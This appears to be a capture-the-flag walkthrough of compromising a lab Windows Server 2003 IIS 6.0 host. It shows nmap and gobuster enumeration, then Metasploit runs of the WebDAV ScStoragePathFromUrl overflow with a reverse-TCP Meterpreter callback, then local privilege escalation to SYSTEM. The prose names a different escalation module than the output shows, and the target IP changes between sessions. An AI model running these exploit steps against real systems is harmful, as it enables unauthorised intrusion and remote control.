# nmap

Enumerating the target using nmap,
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -Pn -A  -p-20000 -sS --vv 10.129.120.60
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 11:13 IST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:13
Completed NSE at 11:13, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:13
Completed Parallel DNS resolution of 1 host. at 11:13, 4.10s elapsed
Initiating SYN Stealth Scan at 11:13
Scanning 10.129.120.60 [20000 ports]
Discovered open port 80/tcp on 10.129.120.60
SYN Stealth Scan Timing: About 10.48% done; ETC: 11:18 (0:04:25 remaining)
SYN Stealth Scan Timing: About 32.38% done; ETC: 11:16 (0:02:07 remaining)
SYN Stealth Scan Timing: About 54.33% done; ETC: 11:16 (0:01:17 remaining)
Completed SYN Stealth Scan at 11:16, 140.65s elapsed (20000 total ports)
Initiating Service scan at 11:16
Scanning 1 service on 10.129.120.60
Completed Service scan at 11:16, 6.62s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.120.60
Retrying OS detection (try #2) against 10.129.120.60
Initiating Traceroute at 11:16
Completed Traceroute at 11:16, 0.48s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 11:16
Completed Parallel DNS resolution of 2 hosts. at 11:16, 0.10s elapsed
NSE: Script scanning 10.129.120.60.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:16
Completed NSE at 11:16, 7.69s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:16
Completed NSE at 11:16, 1.99s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Nmap scan report for 10.129.120.60
Host is up, received user-set (0.36s latency).
Scanned at 2021-08-21 11:13:47 IST for 166s
Not shown: 19999 filtered ports
Reason: 19999 no-responses
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Sat, 21 Aug 2021 05:46:23 GMT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=8/21%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61209339%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=0)
OPS(O1=M54BNW0NNT00NNS%O2=M54BNW0NNT00NNS%O3=M54BNW0NNT00%O4=M54BNW0NNT00NNS%O5=M54BNW0NNT00NNS%O6=M54BNNT00NNS)
WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF0%W5=FAF0%W6=FAF0)
ECN(R=Y%DF=N%TG=80%W=FAF0%O=M54BNW0NNS%CC=N%Q=)
T1(R=Y%DF=N%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   482.31 ms 10.10.16.1
2   482.37 ms 10.129.120.60

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.02 seconds
           Raw packets sent: 40165 (1.771MB) | Rcvd: 13971 (2.561MB)
```
we can see that the site is still under construction and http-title don't show any possible methods,I searched for possible exploits for webdav(which supports some methods)

# gobuster

```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# gobuster dir -u http://10.129.120.60 -w /usr/share/dirb/wordlists/common.txt -e -n
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.120.60
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2021/08/21 11:13:45 Starting gobuster in directory enumeration mode
===============================================================
http://10.129.120.60/_private             [Size: 1529]
http://10.129.120.60/_vti_bin             [Size: 157] [--> http://10.129.120.60/%5Fvti%5Fbin/]
http://10.129.120.60/_vti_cnf             [Size: 1529]                                        
http://10.129.120.60/_vti_log             [Size: 1529]                                        
http://10.129.120.60/_vti_bin/shtml.dll   [Size: 96]                                          
http://10.129.120.60/_vti_bin/_vti_aut/author.dll [Size: 195]                                 
http://10.129.120.60/_vti_bin/_vti_adm/admin.dll [Size: 195]                                  
http://10.129.120.60/_vti_pvt             [Size: 1529]                                        
http://10.129.120.60/_vti_txt             [Size: 1529]                                        
http://10.129.120.60/aspnet_client        [Size: 218]                                         
http://10.129.120.60/Images               [Size: 151] [--> http://10.129.120.60/Images/]      
http://10.129.120.60/images               [Size: 151] [--> http://10.129.120.60/images/]      
                                                                                              
===============================================================
2021/08/21 11:15:51 Finished
===============================================================
```
Nothing much interesting or juicy here.

# searchspolit

```
Microsoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overfl | windows/remote/41992.rb
```

# metasploit

I searched webdav on metasploit and found a few in which we found what we want

```
16  exploit/windows/iis/iis_webdav_scstoragepathfromurl       2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
```
```
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.129.120.60
rhosts => 10.129.120.60
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost 10.10.16.2
lhost => 10.10.16.2
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lport 4242
lport => 4242
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.129.120.60    yes       The target host(s), range CIDR identifier, or hosts file with s
                                             yntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4242             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > targets
[-] Unknown command: targets.
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.129.120.60:80 - The target is vulnerable.
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.16.2:4242 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.129.120.60
[*] Meterpreter session 1 opened (10.10.16.2:4242 -> 10.129.120.60:1030) at 2021-08-21 11:23:22 +0530
```

It worked.
But we have very few command we can run since we are not a privileged user.

so,I migrated to a more stable process (davcdata.exe)

# PrivEsc

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search suggest

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/server/icmp_exfil                                            normal     No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors         2010-03-09       good       No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  post/multi/recon/local_exploit_suggester                               normal     No     Multi Recon Local Exploit Suggester
   3  auxiliary/scanner/http/nagios_xi_scanner                               normal     No     Nagios XI Scanner
   4  post/osx/gather/enum_colloquy                                          normal     No     OS X Gather Colloquy Enumeration
   5  post/osx/manage/sonic_pi                                               normal     No     OS X Manage Sonic Pi
   6  exploit/windows/http/sharepoint_data_deserialization  2020-07-14       excellent  Yes    SharePoint DataSet / DataTable Deserialization
   7  exploit/windows/smb/timbuktu_plughntcommand_bof       2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow


Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/timbuktu_plughntcommand_bof                                                                                                   

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use 2
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               10.10.16.2:4242 -> 10.129.120.60:1030 (10.129.120.60)

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > set showdescription true
showdescription => true
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  true             yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.120.60 - Collecting local exploits for x86/windows...
[*] 10.129.120.60 - 38 exploit checks are being tried...
[+] 10.129.120.60 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
  This module will create a new session with SYSTEM privileges via the 
  KiTrap0D exploit by Tavis Ormandy. If the session in use is already 
  elevated then the exploit will not run. The module relies on 
  kitrap0d.x86.dll, and is not supported on x64 editions of Windows.
[+] 10.129.120.60 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
  This module exploits a NULL Pointer Dereference in win32k.sys, the 
  vulnerability can be triggered through the use of TrackPopupMenu. 
  Under special conditions, the NULL pointer dereference can be abused 
  on xxxSendMessageTimeout to achieve arbitrary code execution. This 
  module has been tested successfully on Windows XP SP3, Windows 2003 
  SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 
  and Windows 2008 R2 SP1 64 bits.
[+] 10.129.120.60 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
  A vulnerability within the Microsoft TCP/IP protocol driver 
  tcpip.sys can allow a local attacker to trigger a NULL pointer 
  dereference by using a specially crafted IOCTL. This flaw can be 
  abused to elevate privileges to SYSTEM.
[+] 10.129.120.60 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
  This module exploits improper object handling in the win32k.sys 
  kernel mode driver. This module has been tested on vulnerable builds 
  of Windows 7 x64 and x86, and Windows 2008 R2 SP1 x64.
[+] 10.129.120.60 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
  This module exploits the vulnerability in mrxdav.sys described by 
  MS16-016. The module will spawn a process on the target system and 
  elevate its privileges to NT AUTHORITY\SYSTEM before executing the 
  specified payload within the context of the elevated process.
[+] 10.129.120.60 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
  This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due 
  to the usage of uninitialized data which allows to corrupt memory. 
  At the moment, the module has been tested successfully on Windows XP 
  SP3, Windows 2003 SP1, and Windows 7 SP1.
```

I tried a few but they failed.Finally exploit/windows/local/ms14_058_track_popup_menu this worked.

```
msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > set lhost 10.10.16.2
lhost => 10.10.16.2
msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Launching notepad to host the exploit...
[+] Process 1908 launched.
[*] Reflectively injecting the exploit DLL into 1908...
[*] Injecting exploit into 1908...
[*] Exploit injected. Injecting payload into 1908...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.25.192
[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.129.25.192:1031) at 2021-08-21 12:14:08 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
